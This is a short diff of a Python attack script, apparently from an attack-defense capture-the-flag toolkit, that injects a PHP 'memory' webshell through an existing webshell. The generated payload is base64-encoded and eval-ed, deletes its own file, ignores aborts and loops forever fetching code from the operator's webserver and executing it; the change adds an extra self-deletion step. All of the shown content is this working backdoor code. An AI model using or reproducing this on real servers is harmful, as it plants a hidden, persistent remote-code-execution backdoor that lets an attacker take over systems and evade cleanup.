@@ -153,7 +153,7 @@ def main():
             file_content = "ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);while(true){$code = file_get_contents('http://%s:%d/code.txt');eval($code);sleep(5);}" % (webserver_host, webserver_port)
             Log.info("Temp memory phpfile : %s" % (file_content))
             Log.info("Encoding phpfile...")
-            file_content = '<?php eval(base64_decode("%s"));?>' % (file_content.encode("base64").replace("\n", ""))
+            file_content = '<?php eval(base64_decode("%s"));unlink(__FILE__);?>' % (file_content.encode("base64").replace("\n", ""))
             Log.info("Final memory phpfile : %s" % (file_content))
             result = webshell.auto_inject_flag_reaper(filename, file_content)
             if result:
